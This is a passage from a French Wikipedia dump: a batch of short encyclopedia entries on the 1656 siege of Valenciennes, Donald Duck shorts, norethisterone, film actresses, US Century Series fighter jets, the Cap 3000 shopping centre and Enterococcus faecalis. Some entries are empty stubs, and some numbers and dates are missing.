Fin juin, le nouveau gouverneur des Pays-Bas, Juan José d'Autriche, décida de porter secours à la ville, dont la situation était devenue critique. La nuit du samedi 15 juillet, au moment où la place était sur le point de tomber, l'armée espagnole apparut.
Pour défendre la ville, Condé inonde les environs par les eaux de l'Escaut, séparant ainsi les deux corps de l’armée française : celui de Turenne et celui de La Ferté. Les deux camps seront désormais reliés par un simple pont de fascines. Le marquis Albert de Mérode, un des défenseurs de la place, est blessé au cours d'une sortie à cheval. Il décède des suites de ses blessures et son corps, inhumé dans l'église Saint-Paul, sera retrouvé lors de la campagne archéologique de 1990.
Dans la nuit du 15 au , Condé attaque à revers le secteur de La Ferté avec une telle détermination qu'il détruit toute résistance française. Fort de , Juan José d'Autriche s'illustre par une brillante charge de cavalerie sur le campement français : Turenne repousse cet assaut, et tente, mais en vain, de porter secours à La Ferté. Désormais en infériorité numérique, il est contraint de lever le siège et fuit en direction du Quesnoy.
Les Espagnols capturèrent 77 officiers français, dont La Ferté, , leurs bagages et toutes leurs provisions, dont un train de siège de 50 canons. De la division de La Ferté, seuls parvinrent à s'échapper en jetant leurs armes et en fuyant en complète déroute.

</doc>
<doc id="2846853" url="https://fr.wikipedia.org/wiki?curid=2846853" title="La Roulotte de Donald">
La Roulotte de Donald

La Roulotte de Donald ("Trailer Horn") est un dessin animé de la série des Donald produit par Walt Disney pour RKO Radio Pictures sorti le .
Synopsis.
Attiré par la caravane de Donald, qui campe en pleine forêt, Tic et Tac vont lui infliger une avalanche de soucis qui vont perturber son moment de villégiature...
Commentaires.
Ce film est à nouveau une confrontation entre Donald et Tic et Tac.
Titre en différentes langues.
D'après IMDb :

</doc>
<doc id="2846856" url="https://fr.wikipedia.org/wiki?curid=2846856" title="Noréthistérone">
Noréthistérone

La noréthistérone est un progestatif de synthèse utilisé dans certaines pilules combinées et certaines pilules progestatives, et pour retarder les menstruations.
La noréthistérone n'est pas encore distribuée en France, mais est depuis plusieurs années disponible sur ordonnance dans de nombreux pays européens comme l'Allemagne, l'Italie, la Belgique, ainsi qu'aux États-Unis. 
Fonctionnement.
L'effet permet de retenir la muqueuse utérine dans l'utérus. En effet, tous les mois (chez une femme ne prenant aucun contraceptif hormonal), le taux de progestérone augmente graduellement, entraînant l'épaississement progressif de l'endomètre qui sera ainsi prêt à accueillir la nidation de l'œuf si un ovule venait à être fécondé. Si aucune fécondation n'a lieu, le taux de progestérone va chuter brutalement, provoquant l'effondrement de la muqueuse utérine devenue inutile : ce sont les règles.
Ainsi, la noréthistérone s'oppose à la desquamation de l'endomètre par son effet semblable à celui de la progestérone.
Posologie.
Le traitement doit être commencé trois jours avant l'arrivée des règles pour laisser le temps à la progestérone de faire son effet. Il se prend à raison de trois comprimés par jour, pour une période pouvant aller jusqu'à douze jours de suite.
La noréthistérone est prise jusqu'à ce que les menstruations ne soient plus indésirables. L'utilisation est normalement de courte durée, mais il n'y a pas de limite de temps fixée par les résumés des caractéristiques du produit.
Indications.
La noréthistérone est uniquement indiquée chez les femmes ne suivant aucune méthode de contraception hormonale (pilule, implant, injection, patch et stérilet hormonal).
Le traitement ne doit pas être suivi en cas de : maladies du foie, maladies cardiovasculaires, irritations cutanées sévères, intolérance au galactose, thromboembolique veineuse. Noréthistérone est également contre-indiqué en cas de dépression, d'épilepsie, d'asthme, de maux de tête chroniques, de diabète, d'obésité sévère, de maladie rénale, d'hypertension artérielle. Enfin, il ne doit pas être utilisé pendant la grossesse et l'allaitement.
Divers.
Le noréthistérone fait partie de la liste des médicaments essentiels de l'Organisation mondiale de la santé (liste mise à jour en ).
Lien externe.
https://pharmaceutical-journal.com/article/ld/questions-on-postponing-menstruation

</doc>
<doc id="2846857" url="https://fr.wikipedia.org/wiki?curid=2846857" title="Francesca Bertini">
Francesca Bertini

Francesca Bertini - pseudonyme d'Elena Seracini Vitiello, née le à Prato et morte le à Rome, est une actrice cinématographique italienne de l'époque du cinéma muet.
Biographie.
Fille de l'accessoiriste napolitain Arturo Vitiello et de l'actrice florentine Adelaide Frataglioni, Francesca Bertini passa son enfance à Naples. Elle commença très jeune à monter sur scène, interprétant des comédies napolitaines, et par la suite elle parut dans un grand nombre de films muets en partie sans intérêt. À 21 ans, elle alla à Rome et interpréta le premier rôle féminin dans "Histoire d'un Pierrot" (1913) mis en scène par Baldassarre Negroni.
C'est deux ans plus tard qu'elle atteignit probablement le sommet de sa carrière avec le rôle d'Assunta Spina, dans le film homonyme tiré du drame de Salvatore Di Giacomo et codirigé et interprété par lui avec Gustavo Serena. Ensuite elle interpréta à l'écran des grands personnages littéraires et théâtraux, comme Fedora, Tosca et la Dame aux Camélias. Sa beauté extraordinaire et sa présence sur la scène, surtout dans les moments tragiques, faisaient d'elle le premier exemple de diva cinématographique.
La guerre terminée, la Fox lui fit une offre alléchante pour jouer dans quelques films américains, mais elle la refusa : elle venait de faire la connaissance du banquier suisse Paul Cartier qu'elle épousa en 1921. Après son mariage, ses apparitions se firent beaucoup plus rares, et il est vraisemblable qu'avec l'arrivée du cinéma parlant, comme bien d'autres acteurs, elle ne sut pas s'adapter aux nouvelles techniques d'interprétation.
Dans les années 1960 et 1970, elle participa à quelques émissions télévisées : elle fut interviewée par Mike Bongiorno et Maurizio Costanzo, et elle évoquait avec une pointe de nostalgie la période lointaine et légendaire de ses triomphes.
En 1976, Bernardo Bertolucci la convainquit de sortir de sa retraite et de paraître dans un bref caméo, en vêtements de religieuse, dans "1900" ("Novecento").
En 1982, le réalisateur Gianfranco Mingozzi tourna pour la télévision un documentaire qui lui était consacré et dédié : "La Dernière Diva".
Filmographie partielle.
Parmi les 90 films qu'elle a interprétés :

</doc>
<doc id="2846872" url="https://fr.wikipedia.org/wiki?curid=2846872" title="Trailer Horn">
Trailer Horn



</doc>
<doc id="2846876" url="https://fr.wikipedia.org/wiki?curid=2846876" title="Guerre de succession espagnole">
Guerre de succession espagnole



</doc>
<doc id="2846882" url="https://fr.wikipedia.org/wiki?curid=2846882" title="Donald blagueur">
Donald blagueur

Donald blagueur (titre original : ") est un court métrage américain réalisé par Jack Hannah, sorti le .
Produit par Walt Disney et distribué par Buena Vista Pictures et RKO Radio Pictures, ce dessin animé fait partie de la série des Donald. 
Synopsis.
En venant élaguer un arbre, Donald aperçoit Tic et Tac en train de stocker leurs noisettes. Il décide de leur jouer un mauvais tour en sciant leur branche
Titre en différentes langues.
D'après IMDb :

</doc>
<doc id="2846889" url="https://fr.wikipedia.org/wiki?curid=2846889" title="Washtub bass">
Washtub bass



</doc>
<doc id="2846890" url="https://fr.wikipedia.org/wiki?curid=2846890" title="Century Series Fighters">
Century Series Fighters

L'appellation « » (en ) désigne une série d'avions de chasse conçus par les États-Unis durant les années 1950, et qui portaient un numéro de désignation supérieur à 100 dans la nomenclature des avions américains de 1926 à 1962. On rencontre également les appellations de « » ou « ».
Ces avions ont marqué les mémoires par leurs performances remarquables pour l'époque et leur apparition en quelques années à peine. Ils comprenaient les premiers modèles réussis d'avions supersoniques au service de l'United States Air Force, qui sont restés en service actif jusque dans les années 1970/80 dans l'Air Force Reserve Command et l'Air National Guard. Ils coïncident avec une période de progrès significatifs dans le domaine de l'aéronautique militaire. Ainsi, le fut le premier avion américain capable de dépasser le mur du son en vol horizontal, mais restait dépourvu de radar. Moins de quatre ans plus tard, le était deux fois plus rapide, disposait d'une électronique de bord très sophistiquée ainsi que d'une soute à armement pouvant emporter des roquettes à tête nucléaire. Trois variantes ultérieures, les QF-100, QF-102 et QF-106, sont restées en service, principalement comme drones aériens, jusqu'à la fin des années 1990.
Le F-104S est resté en service dans l'armée italienne jusqu'en 2004.
Numéros non utilisés dans la série.
Les désignations , et ont été utilisées pour des projets qui n'ont jamais abouti. Des trois projets, seul le North American a effectivement volé, mais n'a été construit qu'en trois prototypes.
La désignation initialement destinée au " et plus tard demandée mais non accordée au prototype d'ADAV Bell XF-109, n'a finalement pas été utilisée.
La désignation " a été utilisée de janvier à pour la version du McDonnell Douglas F-4 Phantom II destinée à l'US Air Force. Cette version a finalement reçu la désignation .
Avions hors de la série.
Le General Dynamics "Aardvark" (premier vol en ) n'est généralement pas considéré comme faisant partie de la série, malgré son numéro 111. Il s'agit d'ailleurs plus d'un bombardier que d'un avion de chasse (en dépit de sa classification « F »).
À partir de , à la suite d'un changement de désignation des avions militaires américains, la numérotation des avions de chasse est repassée à des numéros plus petits (, etc.), fermant ainsi la série. À la fin des années 1970 est apparu le Lockheed Martin F-117 Nighthawk. Son existence n'a été révélée au public qu'en 1988 et sa désignation n'en fait cependant pas un membre de la "".

</doc>
<doc id="2846891" url="https://fr.wikipedia.org/wiki?curid=2846891" title="Chip an' Dale">
Chip an' Dale



</doc>
<doc id="2846892" url="https://fr.wikipedia.org/wiki?curid=2846892" title="Melonie Diaz">
Melonie Diaz

Melonie Diaz est une actrice américaine, née le à New York.
Elle commence sa carrière, dans les années 2000, s'illustrant essentiellement dans des productions indépendantes tout en se démarquant dans des longs métrages tels que "Les Seigneurs de Dogtown" (2005), "Il était une fois dans le Queens" (2006), "Itty Bitty Titty Committee" (2007), "Assassinat d'un présiden"t (2008), "Soyez sympas, rembobinez" (2008) et "Hamlet 2" (2008).
Elle poursuit et enchaîne les rôles et genres variés comme dans le drame acclamé "Fruitvale Station" (2013) de Ryan Coogler ainsi que le thriller "The Belko Experiment" (2016).
Elle est également apparue dans quelques séries télévisées telles que "Nip/Tuck", "", "Person of Interest", "Elementary" et "Room 104".
En 2018, elle succède à Holly Marie Combs, dans le rôle de Mel Vera, la cadette de la fratrie de sorcières dans "Charmed", reboot de la série télévisée fantastique du même nom, produit par le réseau The CW.
Biographie.
Jeunesse et formation.
Melonie Diaz a grandi dans le quartier Lower East Side dans l'arrondissement de Manhattan à New York avec ses parents d'origine portoricaine et sa grande sœur. Elle a étudié à l'école Professional Performing Arts High School.
Carrière.
Débuts et percée au cinéma.
Sa carrière cinématographique commence avec un second rôle pour la comédie dramatique "Bad Luck!" de Tom DiCillo, ce qui lui permet ensuite d'enchaîner avec "Long Way Home" de Peter Sollett ainsi qu'une apparition dans un épisode de la série "New York, police judiciaire". Elle participe entre-temps au pilote d'une série dramatique intitulée "Queens Supreme".
Ce sont ses rôles dans deux drames biographiques "Les Seigneurs de Dogtown" de Catherine Hardwicke ainsi que "Il était une fois dans le Queens" de Dito Montiel qui la révèle à la critique. Elle est notamment proposée pour le Film Independent's Spirit Awards de la meilleure actrice dans un second rôle.
Elle peut donc ensuite tenir des rôles principaux et confirme cette percée avec la romance lesbienne saluée "Itty Bitty Titty Committee", sortie en 2007.
Elle enchaine alors les projets variés : un second rôle dans le drame musical "Feel the Noise", elle accompagne Mischa Barton et Bruce Willis dans la comédie dramatique "Assassinat d'un président", elle rejoint la large distribution de la comédie "Soyez sympas, rembobinez" avec notamment Sigourney Weaver, Jack Black, Danny Glover et Mia Farrow, puis, elle s'essaie à la comédie musicale pour "Hamlet 2".
Plutôt rare sur les écrans de télévision, elle y retourne en 2009, pour jouer dans trois épisodes de la sixième saison de la série télévisée dramatique "Nip/Tuck". Dès lors, elle délaisse un cinéma exposé au profit de productions indépendantes et apparaît régulièrement à la télévision ("Rizzoli and Isles", "", "Person of Interest").
Cinéma indépendant et télévision.
En 2012, elle joue le rôle titre d'une mini-série dramatique "Ro", en six épisodes.
L'année d'après, son rôle dans le drame acclamé "Fruitvale Station" de Ryan Coogler aux côtés de Michael B. Jordan lui vaut les éloges de la critique.
Il s'ensuit d'autres interventions sur le grand et le petit écran, dans des productions mineures, avant qu'elle ne rejoigne, en 2016, le thriller d'action horrifique "The Belko Experiment" dans l'un des rôles principaux.
En 2017, elle joue dans un épisode des séries "Elementary" et "Room 104" et finit par renouer avec le format de mini-série pour la dramatique et musicale "The Breaks".
En 2018, elle rejoint le casting principal de la série "Charmed (2018)", le reboot de la série télévisée fantastique à succès, "Charmed", diffusée entre 1998 et 2006, dans le rôle de Melanie « Mel » Vera aux côtés de Sarah Jeffery et Madeleine Mantock. La série est diffusée depuis le sur The CW. Renouvelée pour une seconde saison, la série lui vaut sa première citation lors de la cérémonie, populaire auprès des adolescents, les Teen Choice Awards.
La même année, elle joue dans ', préquelle des trois films précédents de la saga : "American Nightmare", ' et "". Elle participe aussi à la comédie "Gringo" avec Charlize Theron, Amanda Seyfried et Thandie Newton.
Vie privée.
Elle est mariée avec l'acteur Octavio Genera et annonce en mars 2021 qu'elle est enceinte ; sa grossesse est incorporée dans "Charmed".

</doc>
<doc id="2846894" url="https://fr.wikipedia.org/wiki?curid=2846894" title="Écoute voir">
Écoute voir

Écoute voir est un film français réalisé par Hugo Santiago, sorti en 1979.
Synopsis.
Arnaud de Maule, jeune châtelain et savant émérite, fait appel à la détective Claude Alphand afin qu’elle enquête sur des individus qui s’introduisent mystérieusement dans son domaine des Yvelines. Claude découvre qu’il s’agit des membres d’une étrange secte, l'Église du Renouveau Final, à laquelle s’est récemment ralliée Chloé, la jeune maîtresse d’Arnaud...

</doc>
<doc id="2846895" url="https://fr.wikipedia.org/wiki?curid=2846895" title="Igor Burzanović">
Igor Burzanović

Igor Burzanović est un footballeur international monténégrin né le à Podgorica. Il évolue au poste d'attaquant.

</doc>
<doc id="2846897" url="https://fr.wikipedia.org/wiki?curid=2846897" title="Cap 3000">
Cap 3000

Cap 3000 est un centre commercial français situé en proche banlieue de Nice, dans la ville de Saint-Laurent-du-Var. Ouvert en 1969, il est l'un des plus importants centres commerciaux des Alpes-Maritimes, celui possédant le plus grand nombre de boutiques (300 en 2021), et l'un des plus fréquentés. En février 2021, il est le cinquième plus grand centre commercial de France par la surface commerciale utile avec . 
Même si ce centre commercial régional est situé dans une gamme moyenne-haute, il est un grand lieu de rencontre, des habitants locaux aux touristes étrangers fortunés. Le centre commercial possède des magasins de grande distribution et de services, des boutiques, des restaurants, des cabinets médicaux et des laboratoires d'analyse médicale.
Histoire.
C'est vers la fin des années 1960 que Jean Demogé, président-directeur général des Nouvelles Galeries, a l'idée de construire un grand centre commercial près de l'aéroport de Nice-Côte d'Azur. L'emplacement correspond à une vaste zone marécageuse sur les bords du Var, bien desservie par les voies de communication. À son inauguration, le , le centre se veut moderne, en avance sur son temps, et inspiré des centres commerciaux américains de l'époque. Ainsi, la première plaquette de promotion du centre indique : « "Cap 3000" est un centre de vie où, dans une agréable ambiance, le rêve et la détente se mêlent aux nécessités de la vie de tous les jours ». 
Le nom du centre est l'abréviation de capacité places, en référence au nombre de places de parking. Le centre commercial est le premier de cette importance en France, et est suivi de l'ouverture deux semaines plus tard de Parly 2. Il se compose au départ de cinquante-deux magasins entourant les Nouvelles Galeries sur deux niveaux, et est climatisé. Sur le toit, est construite une piscine dont le fond transparent permet aux clients du centre commercial de voir les baigneurs. Son bassin principal mesure 22 mètres sur 11, s'accompagne d'un bassin pour enfants, et est entouré de loggias. Le centre comporte également un cinéma de 400 places, un drugstore ouvert le soir, et un restaurant pouvant accueillir 350 personnes servies au moyen d'un tapis roulant. "Cap 3000" compte alors environ employés.
Aménagements.
Extensions.
"Cap 3000" bénéficie par la suite trois de extensions : en 1979 sur les terrasses de l'étage, en 1989 au rez-de-chaussée et en 1996. Durant une quinzaine d'années, toute extension du centre commercial est bloquée en raison du classement du terrain où il est implanté en zone inondable après la crue centennale du Var de 1994. 
Un doublement du parking était notamment envisagé. Le centre finance en 2007 le renforcement de la digue la plus proche. D'autres travaux sont menés afin que "Cap 3000" soit suffisamment protégé pour que des extensions soient légalement réalisables. La mairie de Saint-Laurent-du-Var a terminé ces chantiers en 2012.
2015-2021 : extension et rénovation.
En novembre 2014, la société Altarea présente le projet de rénovation et d'agrandissement du centre commercial. La surface doit passer à , le nombre de boutiques à 300 et les places de parking à . Le coût de l’extension-rénovation est estimé entre 400 et 450 millions d’euros. 
En août 2015, le centre inaugure la première partie du nouveau parking silo comprenant 1400 places. Il s'agit des travaux de rénovation de sa zone initiale qui s'achève en 2016. Le parking devient payant au-delà de trois heures de stationnement sauf si achats supérieurs à 50 euros ou de cinq heures pour les « adhérents fidélité ».
En avril 2017, l'extension créée côté nord est terminée et accueille de nouvelles boutiques. L'extension côté sud est ouverte au public à partir de novembre 2019. En juillet 2021 est inaugurée la dernière extension située côté ouest, au premier niveau : une aile de , baptisée « Corso » et dédiée aux marques de luxe et aux créateurs tel que. Cette extension met un terme au projet de rénovation et d'extension entrepris en 2014 par Altarea dont le coût total s'élève à 650 millions d'euros.
La mairie de Saint-Laurent-du-Var aménage dans le même temps de nouveaux accès au centre, de renouvellement urbain et d'agrément dans les avenues et rues à proximité.
Caractéristiques.
Le centre commercial "Cap 3000" est construit en front de mer sur un terrain de . Cette surface comprend les parkings et le bâtiment. En août 2021, ce dernier comporte 282 commerces sur quatre niveaux. La surface commerciale utile de "Cap 3000" est en février 2021 de ce qui en fait le cinquième centre commercial de France de ce point de vue et le deuxième hors région parisienne.
Avant sa rénovation de 2016, le bâtiment comprend six entrées au rez-de-chaussée (deux au Nord, trois à l'Ouest, une à l'Est) et une entrée au premier étage (au Sud), donnant sur le bord de mer. Depuis sa rénovation, le nombre d'entrées est de quatre au rez-de-chaussée (deux au Nord, deux à l'Ouest) et de trois au premier étage (au Sud). La communication entre les deux niveaux se fait par l'intermédiaire d'un grand hall central et par un escalator situé dans un espace appelé au rez-de-chaussée.
Le centre possède un espace nursery, une halte-jeux, un espace gratuit proposant des animations pour les enfants durant 1 h 30, un espace vestiaire, une permanence Lignes d'Azur à propos des transports, une consigne casque gratuite, une conciergerie. 
Les parkings disposent, à l'automne 2018, de places de stationnement, dont 50 places véhicules électriques, 72 places PMR et 214 places de co-voiturage. Ils sont situés sur les côtés nord et ouest du centre, sur trois niveaux en superstructure. Depuis le 5 septembre 2018, la société Cityscoot propose des emplacements dédiés à la location de scooter électrique en libre-service. La construction de pontons permettra également à des bateaux de plaisance d'accoster au plus près du centre. Au terme de la rénovation du centre entre 2015 et 2021, le nombre de places de parking s'élève à .
En 2009, environ personnes y travaillent. Après la fin de l'extension démarrée en 2015, le centre compte environ collaborateurs, ce qui en fait l'un des plus gros employeurs du département.
Les Galeries Lafayette constituent depuis l'origine la locomotive de "Cap 3000". En 2010, Apple ouvre dans le centre sa première boutique dans le département, de même que pour Starbucks en 2012. En décembre 2020, la plus grande pharmacie d'Europe à cette date ouvre ses portes avec une surface de dont de surface de vente.
Une quarantaine d'enseignes de luxe, premium et créateurs (comme Tommy Hilfiger, Zadig &amp; Voltaire Maison Christian Dior, ou bien Philippe Tayac) sont regroupées dans l'aile « Corso » sur située à l'ouest du bâtiment, au premier niveau des marques. Cette aile, qui offre une vue sur la mer, est en forme de courbes censées rappeler « les mouvements et les reflets de l'eau ». Elle dispose d'une grande hauteur sous plafond, lequel laisse entrer la lumière naturelle, son sol est en granito noir, et elle contient des éléments de décoration en verre de Murano et en laiton.
Gestion.
À l'origine, "Cap 3000" est la propriété des Nouvelles Galeries, puis des Galeries Lafayette. Peu avant son rachat en 2010, "Cap 3000" est géré par la société Citynove Asset Management, une filiale détenue à 100 % par le Groupe Galeries Lafayette. Depuis le , il est la propriété de la société Aldeta une société foncière cotée, filiale du Groupe Galeries Lafayette, qui détient et exploite les actifs de "Cap 3000".
En février 2010, le quotidien "La Tribune" annonce que le Groupe Galeries Lafayette chercherait à vendre "Cap 3000". L'opération ne remettrait pas en cause la présence des enseignes du groupe au sein du centre. Elle se ferait par appel d'offres et une quinzaine de sociétés seraient intéressées par ce rachat. Le 7 mai 2010, "Cap 3000" est finalement vendu pour un montant de 450 millions d'euros, à un consortium appelé Altablue, conduit par Altarea, foncière spécialisée, associé à ABP, un fonds de pension néerlandais, et à Predica, la filiale assurance de personnes de Crédit agricole Assurances.
Performances économiques.
En 2009, le chiffre d'affaires de "Cap 3000" atteignait 340 millions d'euros ce qui le plaçait au huitième rang en France. Le taux d'effort est d'environ 9 %. En 2010, il est de 366 millions d'euros. En 2013, le chiffre d'affaires était de 412 millions d'euros. En ce qui concerne le rendement au mètre carré, "Cap 3000" fait partie des cinq premiers centres commerciaux français indique "Nice-Matin" en octobre 2009. Le rendement, en 2010, est de par mètre carré et par an.
Début 2022, le panier moyen des clients (hors aile « Corso » dédiée au luxe) est estimé à 100 euros par le centre commercial. Celui des clients de « Corso », espace avant tout destiné à une clientèle étrangère, est évalué à un montant de 400 à 500 euros.
Fréquentation.
En 2009 et 2010, "Cap 3000" compte huit millions de visiteurs.
En 2013, 2015 et 2019, elle est estimée à 10 millions. Durant la pandémie de Covid-19 en 2020 et 2021, période au cours de laquelle le centre ferme ses portes un peu plus de 3 mois par an, la fréquentation chute à de visiteurs annuels.
Localisation et accès.
"Cap 3000" est situé sur la rive droite du Var, près de son embouchure, à proximité du centre-ville de Saint-Laurent-du-Var. Il est bordé par le Var, le rivage de la mer Méditerranée et la route du bord de mer. Les principales voies d'accès sont l'autoroute A8, la route départementale D 6007 (anciennement RN 7), la route du bord de mer, et la promenade des Flots-Bleus depuis le port de Saint-Laurent-du-Var. L'aéroport de Nice-Côte d'Azur se situe à proximité, sur la rive opposée du Var.
Un arrêt de bus dessert le centre commercial. Plusieurs lignes de bus du réseau de transport en commun Lignes d'Azur y passent. Il s'agit, en décembre 2019, des bus 12, 20, 22, 54, 55, 73, 217, 232 et 706. Enfin, à environ dix minutes à pied de Cap 3000 se trouve la gare de Saint-Laurent-du-Var. Celle-ci accueille le TER Provence-Alpes-Côte d'Azur qui dessert les principales villes du littoral azuréen.
Récompense.
"Cap 3000" a été élu meilleur centre commercial du monde lors du concours des MIPIM Awards 2022. 

</doc>
<doc id="2846898" url="https://fr.wikipedia.org/wiki?curid=2846898" title="No Sail">
No Sail



</doc>
<doc id="2846899" url="https://fr.wikipedia.org/wiki?curid=2846899" title="Donald pêcheur">
Donald pêcheur

Donald pêcheur (") est un dessin animé de la série des Donald produit par Walt Disney pour RKO Radio Pictures sorti le 1950.
Synopsis.
Donald qui veut cuire ses poissons est harcelé par un lion et son jeune qui ne veulent que s'emparer de sa pêche...
Titre en différentes langues.
D'après IMDb :

</doc>
<doc id="2846904" url="https://fr.wikipedia.org/wiki?curid=2846904" title="Kenny Reardon">
Kenny Reardon



</doc>
<doc id="2846910" url="https://fr.wikipedia.org/wiki?curid=2846910" title="Tezdzhyan Naimova">
Tezdzhyan Naimova



</doc>
<doc id="2846911" url="https://fr.wikipedia.org/wiki?curid=2846911" title="Donald à la plage">
Donald à la plage

Donald à la plage (titre original : "") est un court métrage d'animation américain de la série "Donald Duck" réalisé par Jack Hannah pour les studios Disney et sorti en 1950.
Synopsis.
Donald passe une journée à la plage. En allant se baigner, il écrase, inonde puis finit par ensabler une abeille qui ne demandait qu'à bronzer tranquillement…

</doc>
<doc id="2846912" url="https://fr.wikipedia.org/wiki?curid=2846912" title="Mehdi Benoufa">
Mehdi Benoufa



</doc>
<doc id="2846915" url="https://fr.wikipedia.org/wiki?curid=2846915" title="The Warlocks (groupe)">
The Warlocks (groupe)



</doc>
<doc id="2846916" url="https://fr.wikipedia.org/wiki?curid=2846916" title="Bill Bridges">
Bill Bridges

William C. "Bill" Bridges (né le à Hobbs (Nouveau-Mexique) et mort le est un ancien joueur américain de basket-ball. 
Ailier-fort d'1,98 m issu de l'université du Kansas, il passa 13 saisons (1962 à 1975) en National Basketball Association sous les couleurs des St. Louis/Hawks d'Atlanta, des 76ers de Philadelphie, des Lakers de Los Angeles et des Warriors de Golden State. Il remporta le titre de champion NBA avec les Warriors en 1975 et participa à trois All-Star Game. Bien qu'il soit petit pour son poste, Bridges était un excellent rebondeur compilant un double-double (11,9 points, 11,9 rebonds) en carrière.

</doc>
<doc id="2846917" url="https://fr.wikipedia.org/wiki?curid=2846917" title="Enterococcus faecalis">
Enterococcus faecalis

Enterococcus faecalis est une bactérie commensale à Gram positif, habitant le tube digestif des humains et d'autres mammifères.
Comme d'autres espèces du genre "Enterococcus", "E. faecalis" peut causer des infections mortelles chez l'homme et le singe, particulièrement dans un environnement hospitalier : le haut niveau de résistance naturelle aux antibiotiques de la bactérie contribue à sa pathogénicité et au risque nosocomial. 
Elle peut aussi déclencher des inflammations chroniques de l'intestin.
Description.
"E. faecalis" se présente comme un microorganisme non-mobile, anaérobie facultatif. Comme les autres "Enterococcus", il a une forme de cocci. Il fermente le glucose sans production de gaz. C'est une des rares bactéries lactiques à posséder une catalase, active seulement lorsque la bactérie peut acquérir de l'hème . De même, il réduit la teinture de tournesol, mais ne liquéfie pas la gélatine. 
Sa croissance en bouillon nutritif est compatible avec son caractère anaérobie facultatif. 
Pathogénicité.
C'est une bactérie commensale du tube digestif des mammifères.
"E. faecalis" peut causer des endocardites, ainsi que des infections de la vessie, de la prostate ou de l'épididyme. Les infections du système nerveux sont plus rares.
"E. faecalis" est résistant à de nombreux agents antibiotiques communément utilisés (aminoglycosides, aztréonam, céphalosporines, clindamycine, les pénicillines semi-synthétiques nafcilline et oxacilline, ainsi que le cotrimoxazole). L'exposition aux céphalosporines est un facteur de risque particulièrement important pour la colonisation et l'infection aux entérocoques.
Histoire taxonomique.
Avant 1984, alors que les entérocoques étaient membres du genre "Streptococcus", "E. faecalis" était classé sous le taxon "Streptococcus faecalis".
Ainsi, depuis 1984, le nom correct complet (avec auteur) de ce taxon est "Enterococcus faecalis" (Andrewes &amp; Horder 1906) Schleifer &amp; Kilpper-Bälz 1984.
"Enterococcus faecalis" a pour synonyme :
Étymologie.
L'étymologie de cette espèce est la suivante : "fae.ca’lis." L. fem. n. "faex" (gen. "faecis"), Fæces; L. masc./fem. adj. suff. "-alis", suffixe signifiant appartenant à; N.L. masc./fem. adj. "faecalis", appartenant ou en relation avec les Fæces.
Épidémiologie.
Des échanges de bactéries entre humains et porcs existent. La bactérie peut rapidement muter, avec un risque nosocomial important. Les enterocoques peuvent survivre jusqu'à quatre mois sur des surfaces sèches et inertes, ce qui constitue un facteur important de dissémination. 

</doc>
<doc id="2846921" url="https://fr.wikipedia.org/wiki?curid=2846921" title="Cortes catalanes">
Cortes catalanes



</doc>

